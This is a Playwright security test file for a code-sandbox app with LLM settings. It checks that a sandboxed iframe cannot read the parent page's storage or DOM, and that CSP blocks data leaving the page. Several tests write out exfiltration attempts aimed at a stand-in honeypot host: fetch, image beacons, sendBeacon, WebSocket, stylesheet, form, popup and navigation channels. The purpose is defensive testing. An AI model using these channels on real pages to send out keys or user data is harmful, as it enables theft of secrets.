import { test, expect, type Page } from '@playwright/test';

const HONEYPOT = 'https://csp-test-honeypot.local';

test.describe('App-level iframe and LLM security', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('http://localhost:5173');
    await page.evaluate(() => {
      localStorage.setItem('codevinci-llm-enabled', 'true');
      localStorage.setItem('codevinci-llm-config', JSON.stringify({
        provider: 'openai-compatible',
        apiEndpoint: 'http://localhost:11434/v1',
        apiKey: 'sk-test-secret-key-12345',
        defaultModel: 'gpt-4o',
        systemPrompt: 'You are a test assistant.',
        availableModels: ['gpt-4o'],
        connectionValid: true,
        temperature: 0.7,
        topP: 0.95,
        maxTokens: 4096,
        cspOrigin: 'http://localhost:11434',
      }));
    });
    await page.reload();
  });

  test('viewer iframe has sandbox="allow-scripts" without allow-same-origin', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await page.waitForTimeout(1000);

    const sandbox = await page.locator('iframe').first().getAttribute('sandbox');
    expect(sandbox).toBe('allow-scripts');
  });

  test('attack: iframe cannot read parent localStorage (opaque origin)', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await navigateToFrame(page);

    const result = await frame(page).evaluate(() => {
      try {
        (parent as Window).localStorage.getItem('codevinci-llm-config');
        return { blocked: false as const };
      } catch {
        return { blocked: true as const };
      }
    });
    expect(result.blocked).toBe(true);
  });

  test('attack: iframe cannot access parent DOM (opaque origin)', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await navigateToFrame(page);

    const result = await frame(page).evaluate(() => {
      try {
        const val = (parent as Window).document.querySelector('input')?.value;
        return { blocked: false as const, value: val };
      } catch {
        return { blocked: true as const };
      }
    });
    expect(result.blocked).toBe(true);
  });

  test('iframe mock localStorage works (user code can use storage)', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    await page.selectOption('select', 'view-edit');
    await navigateToFrame(page);

    const result = await frame(page).evaluate(() => {
      try {
        localStorage.setItem('test-key', 'test-value');
        const val = localStorage.getItem('test-key');
        localStorage.removeItem('test-key');
        const after = localStorage.getItem('test-key');
        return { setAndGet: val, removed: after };
      } catch (e) {
        return { error: (e as Error).message };
      }
    });
    expect(result.setAndGet).toBe('test-value');
    expect(result.removed).toBeNull();
  });

  test.describe('CSP exfiltration prevention', () => {
    test.beforeEach(async ({ page }) => {
      await setupAndAcceptDisclaimer(page);
      await page.selectOption('select', 'view-edit');
      await navigateToFrame(page);
    });

    test('iframe can load CDN imports (allowed by CSP)', async ({ page }) => {
      let captured: string | undefined;

      // esm.sh is in CSP script-src, so module imports work
      await page.route('**/esm.sh/**', (route) => {
        captured = 'intercepted';
        route.fulfill({ status: 200, body: 'export default {}' });
      });

      await frame(page).evaluate(async () => {
        try { await import('https://esm.sh/react'); } catch { /* mock response */ }
      });
      await page.waitForTimeout(1000);

      expect(captured).toBe('intercepted');
    });

    test('CSP blocks fetch to unauthorized origin', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/steal*', () => { caught = true; });

      await frame(page).evaluate(async (url) => {
        try { await fetch(url + '/steal?key=test'); } catch { /* CSP blocks */ }
      }, HONEYPOT);

      await page.waitForTimeout(500);
      expect(caught).toBe(false);
    });

    test('CSP blocks image beacon to unauthorized origin', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/beacon*', () => { caught = true; });

      await frame(page).evaluate(async (url) => {
        return new Promise<void>((resolve) => {
          const img = new Image();
          img.onload = () => resolve();
          img.onerror = () => resolve();
          img.src = url + '/beacon?key=test';
          setTimeout(resolve, 2000);
        });
      }, HONEYPOT);

      expect(caught).toBe(false);
    });

    test('CSP blocks sendBeacon to unauthorized origin', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/beacon*', () => { caught = true; });

      await frame(page).evaluate((url) => {
        navigator.sendBeacon(url + '/beacon', 'key=test');
      }, HONEYPOT);
      await page.waitForTimeout(500);

      expect(caught).toBe(false);
    });

    test('CSP blocks WebSocket to unauthorized origin', async ({ page }) => {
      let caught = false;
      await page.route('wss://csp-test-honeypot.local/*', () => { caught = true; });

      await frame(page).evaluate(async () => {
        return new Promise<void>((resolve) => {
          try {
            const ws = new WebSocket('wss://csp-test-honeypot.local/steal');
            ws.onopen = () => resolve();
            ws.onerror = () => resolve();
          } catch { resolve(); }
          setTimeout(resolve, 2000);
        });
      });

      expect(caught).toBe(false);
    });

    test('CSP blocks stylesheet to unauthorized origin', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/css*', () => { caught = true; });

      await frame(page).evaluate(async (url) => {
        return new Promise<void>((resolve) => {
          const link = document.createElement('link');
          link.rel = 'stylesheet';
          link.href = url + '/css?key=test';
          link.onload = () => resolve();
          link.onerror = () => resolve();
          document.head.appendChild(link);
          setTimeout(resolve, 2000);
        });
      }, HONEYPOT);

      expect(caught).toBe(false);
    });

    test('CSP blocks form submission to unauthorized origin', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/form*', () => { caught = true; });

      await frame(page).evaluate((url) => {
        const form = document.createElement('form');
        form.method = 'GET';
        form.action = url + '/form';
        const input = document.createElement('input');
        input.name = 'key';
        input.value = 'test';
        form.appendChild(input);
        document.body.appendChild(form);
        try { form.submit(); } catch { /* form-action blocks */ }
      }, HONEYPOT);
      await page.waitForTimeout(500);

      expect(caught).toBe(false);
    });

    test('sandbox blocks window.open popup', async ({ page }) => {
      let caught = false;
      await page.route(HONEYPOT + '/popup*', () => { caught = true; });

      await frame(page).evaluate((url) => {
        try { window.open(url + '/popup?key=test'); } catch { /* sandbox blocks */ }
      }, HONEYPOT);
      await page.waitForTimeout(500);

      expect(caught).toBe(false);
    });

    test('sandbox blocks top navigation', async ({ page }) => {
      await frame(page).evaluate((url) => {
        try { (parent as Window).location.href = url + '/steal?key=test'; } catch { /* sandbox blocks */ }
      }, HONEYPOT);
    });
  });

  test('CSP meta tag on parent page includes all required directives', async ({ page }) => {
    await setupAndAcceptDisclaimer(page);
    const csp = await page.evaluate(() =>
      document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content')
    );
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).not.toContain("'unsafe-eval'");
  });
});

function frame(page: Page) {
  const f = page.frames().find(f => f.url() === 'about:srcdoc');
  if (!f) throw new Error('iframe frame not found');
  return f;
}

async function navigateToFrame(page: Page) {
  await page.waitForSelector('iframe[sandbox*="allow-scripts"]', { timeout: 5000 });
  await page.waitForTimeout(1500);
  expect(frame(page)).toBeDefined();
}

async function setupAndAcceptDisclaimer(page: Page) {
  await page.getByRole('button', { name: 'Run code' }).click();
  await page.waitForTimeout(500);
}
